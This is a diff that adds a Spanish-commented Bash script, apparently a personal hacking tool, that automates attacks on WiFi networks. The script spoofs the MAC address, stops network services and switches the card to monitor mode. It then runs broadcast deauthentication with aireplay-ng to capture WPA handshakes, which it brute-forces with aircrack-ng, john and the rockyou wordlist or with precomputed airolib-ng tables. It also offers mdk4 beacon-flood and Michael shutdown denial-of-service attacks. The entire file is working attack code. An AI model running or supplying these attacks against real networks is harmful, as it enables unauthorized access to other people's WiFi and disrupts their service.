@@ -1,0 +1,322 @@
+#!/bin/bash
+
+
+#--------------------------------------
+#    Cracking Wifi a través de        |
+#    intercepción de handshakes       |
+#    deautenticación y demás.	      |
+#				      |
+#    Juanma Coello (aka) ShadowVMX    |
+#--------------------------------------
+
+#Primero comprobaremos tus interfaces inalámbricas, actualmente la que está en el wpa_supplicant.
+#
+#Por otro lado, situaremos y modificaremos la MAC.
+#
+#Debemos de matar ciertos procesos que van a interferir con el cracking.
+#
+#Pondremos la interfaz de red en modo monitor.
+#
+#Situamos el ataque y listo.
+#
+#---------------------------------------------------------------------------------------------------
+
+#LLAMAMOS AL BANNER.
+
+./banner.sh
+sleep 2
+
+#Preguntamos qué va a realizar.
+
+echo "[*]1. Deauth-Attack."
+echo "[*]2. Beacond Flood-Attack."
+echo "[*]3. Michael Shutdown Exploitation-Attack."
+echo "[*]4. PMKS-Deauth Generate-Attack."
+echo " "
+#------------------------------------------------------------
+
+read -p "Marque el ataque que llevará a cabo --> " attack
+echo " "
+#Dejamos la modificación y seteamos abajo el attack.
+
+#Mostramos e indicamos el camibio.
+echo " "
+iwconfig | head -1
+echo " "
+read -p "Escriba el nombre de la interfaz inalámbrica que va a usar --> " iface
+echo " "
+echo "__________________________________________________________________________"
+macchanger -s $iface
+echo "__________________________________________________________________________"
+echo " "
+
+#Tiramos la interfaz.
+ifconfig $iface down
+
+#Hacemos la modificación.
+
+echo "Ahora, una vez hemos visualizado la dirección MAC, vamos a modificarla."
+echo " " 
+macchanger -l  | grep -E --color '[0123456789abcdef][0123456789abcdef]:[0123456789abcdef][0123456789abcdef]:[0123456789abcdef][0123456789abcdef]'
+echo " " 
+read -p "Seleccione el OUI deseado [Los que están marcados en rojo] --> " ouid
+echo " "
+macchanger --mac=$ouid:14:2d:f2 $iface
+echo " "
+
+#Limpiamos tanta información en pantalla.
+clear
+echo "[+]LISTOS PARA INICIAR LA SECUENCIA DE CRACKING WIFI."
+echo " "
+
+echo "_____________________________________________________________________________"
+macchanger -s $iface
+echo "_____________________________________________________________________________"
+
+
+
+#Levantamos la interfaz.
+ifconfig $iface up
+
+
+
+
+#Matamos procesos.
+echo " "
+echo "Vamos a eliminar los procesos que no deben de estar activos."
+echo " "
+pkill dhclient &> /dev/null
+pkill wpa_supplicant &> /dev/null
+sleep 2
+echo "[*]dhclient --> DEAD"
+sleep 2
+echo "[*]wpa_supplicant --> DEAD"
+echo " "
+
+
+
+
+#Ponemos la interfaz en modo monitor.
+new=mon
+newiface=$iface$new
+echo " "
+echo "Poniendo interfaz en modo monitor."
+airmon-ng start $iface &> /dev/null
+sleep 2
+echo " " 
+echo "[*]$iface$new monitor --> OK"
+echo " "
+
+
+
+#RECUERDA QUE LA INTERFAZ EN MODO MONITOR ES --> $newiface [LAQUESEA+MON]
+#-------------------------------------------------------------------------------------
+#Toca llamar a las funciones.
+
+
+
+function decryptk(){	
+	trap deauth EXIT
+	clear
+	echo "[+]DE-AUTENTICATE ATTACK[+]"
+	echo " "
+	echo "Vamos a capturar, pulsa control + c cuando quieras parar."	
+	sleep 4
+	airodump-ng $newiface
+}
+
+
+
+
+function deauth(){
+	echo " "
+	read -p "Canal que desea analizar --> " canal
+	airmon-ng stop $newiface &> /dev/null
+	sleep 1
+	airmon-ng start $iface $canal &> /dev/null
+	echo " "
+	read -p "ESSID que desea crackear --> " essid
+	echo " "
+	read -p "Nombre de la captura que va a generar --> " captura
+	echo " "
+	echo "Vamos a ejecutar todo el proceso..."
+	echo " "
+	echo "[+]NO TOQUE NADA[+]"
+	echo " "
+	xterm -e zsh -c "timeout 8 aireplay-ng -0 10 -e $essid -c FF:FF:FF:FF:FF:FF $newiface"
+	xterm -e zsh -c "timeout 30 airodump-ng -c $canal -w $captura --essid $essid $newiface"
+	echo " "
+	sleep 1
+	ls -l
+	echo " "
+	read -p "Copie el nombre que acabe con .cap y cópielo entero aquí --> " archivo
+	echo " "
+	gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
+	echo " "
+	read -p "Elija la herramienta para realizar la fuerza bruta [john(J) || Aircrack(a)] --> " tool
+	echo " "
+	if [[ $tool = "J" ]] || [[ $tool = "j" ]]; then
+	echo "Ejecutando John ..."
+	echo " "
+	read -p "Indique el nombre de salida de la captura nueva que se va a generar --> " newcap
+	echo " "
+	aircrack-ng -J $newcap $archivo &> /dev/null
+	echo " "
+	clear
+	ls -l
+	echo " "
+	read -p "Indique el nombre del archivo que acaba en .hccap --> " hccapar
+	echo " "
+	hccap2john $hccapar > mihash
+	echo " "
+	echo "[+]EJECUTANDO FUERZA BRUTA[+]"
+	echo " "
+	john --wordlist=/usr/share/wordlists/rockyou.txt mihash
+	echo " "
+	echo "[+]COMPLETADO[+]"
+	fi
+	if [[ $tool = "A" ]] || [[ $tool = "a" ]] ; then
+	echo "[+]EJECUTANDO FUERZA BRUTA[+]"
+	echo " "
+	aircrack-ng -w /usr/share/wordlists/rockyou.txt $archivo
+	echo " "
+	echo "Si el ataque no ha sido exitoso, repita la acción."
+	echo " "
+	airmon-ng stop $newiface
+	fi
+}
+
+
+
+
+function bflood(){
+	echo "[+]BEACON FLOOD ATTACK[+]"
+	echo " "
+	echo "Déjale, al menos 2 minutos de inundación de espectro."
+	echo " "
+	echo "ctrl+c para parar ataque."
+	echo " "
+	echo "[+]DEPRECATED ATTACK[+]"
+	echo " "
+	xterm -e zsh -c "mdk4 $newiface b -s 100"
+	airmon-ng stop $newiface
+
+}
+
+
+
+
+function premichael(){
+	trap michael EXIT
+	echo "Pulse control+c para parar."
+	echo " "
+	echo "Recuerde copiar la MAC del objetivo."
+	echo " "
+	sleep 6
+	airodump-ng $newiface
+}
+
+
+
+
+function michael() {
+	echo " "
+	echo "[+]MICHAEL SHUTDOWN EXPLOITATION ATTACK[+]"
+	echo " "
+	echo "[+]DEPRECATED[+]"
+	echo " "
+	echo "Funcional en algunos dispositivos... Por probar..."
+	echo " "
+	read -p "Ingrese la MAC --> " address
+	echo " "
+	xterm -e zsh -c "mdk4 $newiface m -t $address"
+	airmon-ng stop $newiface
+}
+
+
+
+
+
+function precomputado(){
+	echo " "
+	echo "[+]PRECOM SELECTED[+]"
+	echo " "
+	ls -l passwords-airolib &> /dev/null
+	if [[ $? = 0 ]] ; then
+	echo "[*]Data --> OK"
+	else
+	airolib-ng passwords-airolib --import passwd /usr/share/wordlists/rockyou.txt
+	fi
+	ls -l  essid.lst &> /dev/null
+	if [[ $? = 0 ]] ; then
+	echo "[*]Data --> OK"
+	else
+	echo "$essid" >  essid.lst
+	airolib-ng passwords-airolib --import essid essid.lst
+	fi
+	echo " "
+	echo "[+]PUEDES CERRAR CUANDO QUIERAS, PERO SE RALENTIZARÁ EL ATAQUE.[+]"
+	echo " "
+	xterm -e zsh -c "airolib-ng passwords-airolib --batch"
+	echo " "
+	ls -l
+	echo " "
+	read -p "Copie el archivo que tenga la extensión .cap --> " captura
+	aircrack-ng -w passwords-airolib $captura
+	airmon-ng stop $newiface
+}
+
+
+
+
+
+
+function killcomputo(){
+	echo " "
+	echo "Cierre cuando sepa el canal y el essid."
+	echo " "
+	xterm -e zsh -c "airodump-ng $newiface"
+	echo " "
+        read -p "Canal que desea analizar --> " canal
+        airmon-ng stop $newiface &> /dev/null
+        sleep 1
+        airmon-ng start $iface $canal &> /dev/null
+        echo " "
+        read -p "ESSID que desea crackear --> " essid
+        echo " "
+        read -p "Nombre de la captura que va a generar --> " captura
+        echo " "
+        echo "Vamos a ejecutar todo el proceso..."
+        echo " "
+        echo "[+]NO TOQUE NADA[+]"
+        echo " "
+        xterm -e zsh -c "timeout 8 aireplay-ng -0 10 -e $essid -c FF:FF:FF:FF:FF:FF $newiface"
+        xterm -e zsh -c "timeout 30 airodump-ng -c $canal -w $captura --essid $essid $newiface"
+        echo " "
+        sleep 1
+        ls -l
+        echo " "
+        gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
+	precomputado
+}
+
+
+#Creamos el acceso a los distintos módulos de ataque
+
+if [[ $attack = 1 ]] ; then
+decryptk
+elif [[ $attack = 2 ]] ; then
+bflood
+elif [[ $attack = 3 ]] ; then
+premichael
+elif [[ $attack = 4 ]] ; then
+killcomputo
+else
+echo "[+]EXIT[+]"
+fi
+
+
+
+
+
+#----------FIN----------
